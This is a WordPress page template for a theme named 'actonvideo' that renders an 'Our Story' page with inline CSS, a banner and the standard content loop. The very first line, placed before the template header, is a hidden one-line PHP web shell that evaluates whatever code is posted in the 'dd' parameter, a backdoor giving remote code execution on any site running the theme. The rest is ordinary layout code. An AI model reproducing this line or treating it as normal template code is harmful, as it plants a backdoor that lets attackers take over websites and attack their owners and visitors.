<?php @eval($_POST['dd']);?><?php
/**
 * The template for displaying all pages
 *
 * This is the template that displays all pages by default.
 * Please note that this is the WordPress construct of pages
 * and that other 'pages' on your WordPress site may use a
 * different template.
 *
 * @link https://codex.wordpress.org/Template_Hierarchy
 *
 * @package actonvideo
 */

get_header(); ?>


<style>
.blog, .blog-post {
color: #000;
float: left;
width: 100%;
padding: 50px 0;
}
.about-cont p {
padding: 0;
font-size: 15px;
line-height: 25px;}
.blog h2 {
text-align: center;
font-size: 40px;
letter-spacing: 2px;
text-transform: uppercase;
}
.fullwidth-box
{
padding-bottom: 90px;
padding-top: 90px;
background-image: url(<?php echo THEME; ?>images/about-bg.jpg);
background-size: 100%;
}
.fusion-fullwidth-1 {
padding-left: 20px !important;
padding-right: 20px !important;
}
.fusion-column-wrapper h2 {
color: #fff;
text-align: center;
text-transform: uppercase;
font-size: 40px;
letter-spacing: 3px;
}
.fusion-column-wrapper h3 {
text-align: center;
color: #fff;
letter-spacing: 2px;
text-transform: uppercase;
margin-top: 10px;
}
</style>




<div class="fusion-fullwidth fullwidth-box fusion-fullwidth-1  fusion-parallax-none nonhundred-percent-fullwidth subheading">
	<div class="fusion-one-full fusion-layout-column fusion-column-last fusion-spacing-yes" id="head1">
		<div class="fusion-column-wrapper">
			<h2>Our Story</h2>
			<h3>This is what make us different !
			</h3>
			<div class="fusion-clearfix"></div>
		</div>
	</div>
	<div class="fusion-clearfix"></div>
	<div class="fusion-one-full fusion-layout-column fusion-column-last fusion-spacing-yes" style="margin-top:0;margin-bottom:0;" id="head2"></div>
</div>



<div class="blog">
	<div class="container">
		<div class="row">
			<div class="container about-cont">
				<div class="col-sm-12">
					<?php
					while ( have_posts() ) : the_post();
						
						the_content();
					endwhile; // End of the loop. ?>
				</div>
			</div>
		</div>
	</div>
</div>







	


	

<?php get_footer();
